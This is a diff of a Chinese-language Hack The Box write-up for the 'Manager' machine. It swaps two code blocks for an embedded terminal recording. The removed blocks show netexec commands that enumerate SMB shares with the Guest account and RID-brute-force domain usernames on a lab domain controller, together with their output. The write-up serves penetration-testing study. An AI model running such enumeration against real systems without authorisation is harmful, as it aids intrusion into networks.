@@ -69,20 +69,6 @@ Open 10.10.11.236:52587
 
 在没有任何账户的情况下，尝试使用Windows内置的Guest账户枚举SMB文件共享
 
-```bash
-kali@kali[~]$ netexec smb 10.10.11.236 -u "Guest" -p "" --shares
-SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
-SMB         10.10.11.236    445    DC01             [+] manager.htb\Guest: 
-SMB         10.10.11.236    445    DC01             [*] Enumerated shares
-SMB         10.10.11.236    445    DC01             Share           Permissions     Remark
-SMB         10.10.11.236    445    DC01             -----           -----------     ------
-SMB         10.10.11.236    445    DC01             ADMIN$                          Remote Admin
-SMB         10.10.11.236    445    DC01             C$                              Default share
-SMB         10.10.11.236    445    DC01             IPC$            READ            Remote IPC
-SMB         10.10.11.236    445    DC01             NETLOGON                        Logon server share 
-SMB         10.10.11.236    445    DC01             SYSVOL                          Logon server share
-```
-
 发现虽然启用了 `Guest` 账户，但是只有默认共享 `IPC$` 的读取权限，没有什么有用的信息。
 
 然后我们使用 `Guest` 账户进行RID爆破，枚举域用户名：
@@ -90,43 +76,9 @@ SMB         10.10.11.236    445    DC01             SYSVOL                      
 > [!note]
 > RID爆破(RID Cycling)的原理是：由于 RIDs 是连续的，所以攻击者可以暴力破解或猜测 RIDs 和 SIDs 来枚举域对象
 
-```bash
-kali@kali[~]$ netexec smb 10.10.11.236 -u "Guest" -p "" --rid-brute
-SMB         10.10.11.236    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
-SMB         10.10.11.236    445    DC01             [+] manager.htb\Guest: 
-SMB         10.10.11.236    445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
-SMB         10.10.11.236    445    DC01             500: MANAGER\Administrator (SidTypeUser)
-SMB         10.10.11.236    445    DC01             501: MANAGER\Guest (SidTypeUser)
-SMB         10.10.11.236    445    DC01             502: MANAGER\krbtgt (SidTypeUser)
-SMB         10.10.11.236    445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
-SMB         10.10.11.236    445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
-SMB         10.10.11.236    445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
-SMB         10.10.11.236    445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
-SMB         10.10.11.236    445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
-SMB         10.10.11.236    445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
-SMB         10.10.11.236    445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
-SMB         10.10.11.236    445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
-SMB         10.10.11.236    445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
-SMB         10.10.11.236    445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
-SMB         10.10.11.236    445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
-SMB         10.10.11.236    445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
-SMB         10.10.11.236    445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
-SMB         10.10.11.236    445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
-SMB         10.10.11.236    445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
-SMB         10.10.11.236    445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
-SMB         10.10.11.236    445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
-SMB         10.10.11.236    445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
-SMB         10.10.11.236    445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
-SMB         10.10.11.236    445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
-SMB         10.10.11.236    445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
-SMB         10.10.11.236    445    DC01             1113: MANAGER\Zhong (SidTypeUser)
-SMB         10.10.11.236    445    DC01             1114: MANAGER\Cheng (SidTypeUser)
-SMB         10.10.11.236    445    DC01             1115: MANAGER\Ryan (SidTypeUser)
-SMB         10.10.11.236    445    DC01             1116: MANAGER\Raven (SidTypeUser)
-SMB         10.10.11.236    445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
-SMB         10.10.11.236    445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
-SMB         10.10.11.236    445    DC01             1119: MANAGER\Operator (SidTypeUser)
-```
+攻击过程如下
+
+{{< asciinema file="HTB-Machines-Manager/rid_cycling.cast" poster="npt:0:24" labeledMarkers="0.5:探测匿名账户是否启用,11.1:探测来宾账户是否启用,24.3:RID爆破拿到用户名"  >}}
 
 其中 `SidTypeUser` 代表用户，我们可以得到一份用户清单 `usernames.txt`
 
